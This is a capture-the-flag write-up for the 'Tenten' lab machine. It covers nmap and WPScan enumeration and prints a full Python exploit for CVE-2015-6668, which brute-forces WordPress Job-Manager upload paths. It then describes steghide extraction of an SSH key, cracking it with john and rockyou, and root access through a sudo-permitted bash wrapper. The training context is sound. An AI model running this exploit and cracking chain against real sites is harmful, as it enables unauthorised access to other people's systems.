# TENTEN
### Info:
OS: Linux<br>
IP: 10.10.10.10<br>
Difficulty : Medium <br>
### Enumeration:
```nmap -sC -sV -oA nmap 10.10.10.10``` <br>

gives us the results : <br>
![alt text](https://i.imgur.com/AYDx9Ai.png) <br>
As it is WordPress, running WPScan: 
![alt text](https://i.imgur.com/2ikd5QM.png) <br>
Gives us the user and version details.
### Exploitation:
Vulnerability Exploited: CV filename disclosure on Job-Manager WP plugin (CVE-2015-6668) <br>
<b>Exploit.py</b>
```
import requests

print """  
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  
"""  
website = raw_input('Enter a vulnerable website: ')  
filename = raw_input('Enter a file name: ')

filename2 = filename.replace(" ", "-")

for year in range(2017,2019):  
    for i in range(1,13):
        for extension in {'jpeg','png','jpg'}:
            URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02}".format(i) + "/" + filename2 + "." + extension
            req = requests.get(URL)
            if req.status_code==200:
                print "[+] URL of CV found! " + URL
```
We uploaded a png and tried to look for its url by : <br>
![alt text](https://i.imgur.com/0CaRrNz.png)
But injecting PHP with that image failed. <br>
Looking into HackerAccessgranted file and running exploit.py: <br>
![alt text](https://i.imgur.com/moiKxEO.png)
We get an image and running steghide : <br>
![alt text](https://i.imgur.com/vFrPCw9.png)<br>
Running sshng2john on the id_rsa :
![alt text](https://i.imgur.com/GTUmgWQ.png) <br>
and then running john with rockyou gives us the password as `superpassword` : 
![alt text](https://i.imgur.com/MovF3gj.png) <br>
Using this password with ssh as:
![alt text](https://i.imgur.com/ODT0mWe.png) <br>
spawns the shell for us.
### Privilege Escaltion:
Privilege Escalation Vulnerability:<br>
Using `sudo -l` shows us a `/bin/fuckin` which is simple running /bin/bash as root and taking in arguments.
![alt text](https://i.imgur.com/JHMRrq9.png) <br>
and we get root.
### KNOWLEDGE GAIN:
WPScan <br>
sshng2john and john the ripper <br>
CVE 2015-6668
